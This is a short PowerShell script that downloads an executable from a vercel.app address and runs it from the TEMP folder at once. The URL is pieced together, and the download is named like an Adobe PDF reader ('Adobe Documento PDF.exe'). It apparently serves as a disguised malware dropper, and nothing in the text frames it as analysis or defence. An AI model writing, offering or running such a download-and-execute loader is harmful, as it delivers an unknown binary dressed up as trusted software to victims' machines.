$u = 'https' + '://' + 'testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe'
$n = [System.IO.Path]::Combine($env:TEMP, ('Adobe' + [char]32 + 'Documento' + [char]32 + 'PDF.exe'))
$w = (New-Object Net.WebClient)
$w.DownloadFile($u, $n)
(Start-Process -FilePath $n)
